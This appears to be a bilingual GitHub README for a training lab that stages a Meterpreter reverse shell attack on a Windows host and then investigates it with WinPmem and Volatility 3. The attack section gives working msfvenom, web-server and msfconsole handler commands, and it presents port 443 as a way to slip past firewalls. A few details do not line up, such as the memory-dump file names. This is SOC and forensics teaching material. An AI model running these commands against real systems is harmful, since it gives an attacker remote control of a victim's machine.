# Reverse-Shell-Memory-Forensics-Lab
Reverse Shell Attack Simulation + RAM Analysis with Volatility 3

# Labo Reverse Shell + Memory Forensics


## 📋 Project Description

Hands-on cybersecurity lab demonstrating a **Meterpreter reverse shell attack** (Metasploit) followed by **memory forensics investigation** using **WinPmem** acquisition and **Volatility 3** analysis.

### Key Learning Objectives:
- Generate stealthy Meterpreter payload (**port 443 HTTPS evasion**)
- Acquire full RAM snapshot from compromised Windows host
- Detect malicious processes (`shell.exe`) via `windows.pslist`
- Extract process file handles (`windows.dumpfiles`) proving network/reverse shell activity
- Complete **attack/defense workflow** for SOC analyst training


## 🖥️ Architecture Labo



`Kali Linux : 192.168.30.35  (Attaquant) ` :
Metasploit + msfvenom 
` Windows Victim (Cible)`:
WinPmem
` Windows **PC tiers propre** ` : Volatility 3

## 1️⃣ Génération Payload Meterpreter


### Kali - Créer reverse shell EXE
 `msfvenom -p windows/meterpreter/reverse_tcp \   LHOST=192.168.30.35 LPORT=443  \ -f exe > shell.exe` 

**Port 443**  = HTTPS →  **non suspect**  (firewall OK)

## 2️⃣ Serveur Malveillant



### Kali - Serveur web simple
 ` python3 -m http.server 8080` 

**URL fichier malveillant**  :  `https://192.168.30.35:8080/shell.exe`


## 3️⃣ Handler Metasploit


### Kali - Écoute reverse shell
 `msfconsole -q -x " use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.30.35; set LPORT 443; exploit"` 

**Windows infecté** : Télécharge et double-clic  `shell.exe`  →  **Session Meterpreter active !**


## 4️⃣ Memory Acquisition (WinPmem)

**Windows infecté**  :

`winpmem.exe physmem.raw` 

→  **image.raw**  =  **Snapshot RAM complète**  (processus, DLLs, connexions..)

## 5️⃣ Analyse Forensics (Volatility 3)

**PC tiers propre**  :


`git clone https://github.com/volatilityfoundation/volatility3.git cd volatility3`  

### Lister processus suspects



`py vol.py -f image.raw windows.pslist ` 
| PID  | Name      | PPID | Thds | Start       | Exit |
|------|-----------|------|------|-------------|------|
| 1234 | shell.exe | 456  | 8    | 2026-01-17  | -    |
 

### Extraire fichiers/DLLs ouverts par shell.exe

`py vol.py -f image.raw -o ./dumps windows.dumpfiles --filter shell.exe` 


## 📚 Sources & Outils
| Outil              | Lien |
|--------------------|------|
| **WinPmem**        | [GitHub](https://github.com/Velocidex/WinPmem/releases/) |
| **msfvenom**       | [Cheatsheet](https://andrew-long.medium.com/msfvenom-cheatsheet-f9e43edae9f1) |
| **Volatility 3**   | [Guide](https://www.varonis.com/blog/how-to-use-volatility) 


----------





